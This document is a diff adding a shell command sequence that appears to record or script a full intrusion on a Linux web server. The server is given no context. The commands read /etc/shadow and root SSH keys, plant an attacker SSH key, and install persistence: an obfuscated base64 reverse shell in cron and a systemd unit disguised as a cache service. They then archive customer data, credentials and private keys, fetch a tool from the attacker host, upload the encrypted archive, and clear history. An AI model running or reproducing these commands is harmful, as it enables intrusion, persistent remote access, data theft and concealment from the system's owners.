@@ -1,0 +1,41 @@
+id
+whoami
+cat /etc/shadow
+ls -la /root/
+cat /root/.ssh/authorized_keys
+mkdir -p /root/.ssh
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKbOYNBdwMoZ9Z0ybkFPGSCoKq3qMEiKpYBCqJMzFxYz backup-automation@mgmt' >> /root/.ssh/authorized_keys
+crontab -l
+(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzIwMy4wLjExMy44OS80NDQ0IDA+JjE= | base64 -d | bash" > /dev/null 2>&1') | crontab -
+cat > /tmp/reverse-proxy-cache.service << 'HEREDOC'
+[Unit]
+Description=Reverse Proxy Cache Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/203.0.113.89/4444 0>&1'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+HEREDOC
+cp /tmp/reverse-proxy-cache.service /etc/systemd/system/
+systemctl enable reverse-proxy-cache.service
+ls -la /var/www/app/
+find /var/www/app/ -name "*.csv" -o -name "*.txt" -o -name "*.json" | head -20
+cat /var/www/app/customer_db.csv | head -5
+cat /var/www/app/api_credentials.txt
+cat /var/www/app/ssh_private_keys.txt | head -10
+cat /var/www/app/internal_network_map.txt
+cd /var/www/app/
+tar czf /tmp/sensitive_data.tar.gz customer_db.csv api_credentials.txt ssh_private_keys.txt internal_network_map.txt
+ls -la /tmp/sensitive_data.tar.gz
+wget -q http://203.0.113.89:8080/tools/encrypt_tool.py -O /tmp/encrypt_tool.py
+python3 /tmp/encrypt_tool.py --mode encrypt --seed "pr0j3ct_m4yh3m_2024" --input /tmp/sensitive_data.tar.gz --output /tmp/encrypted_exfil.bin
+curl -s -X POST -F "file=@/tmp/encrypted_exfil.bin" http://203.0.113.89:8080/upload
+rm /tmp/sensitive_data.tar.gz
+rm /tmp/encrypt_tool.py
+echo "cleanup done"
+history -c
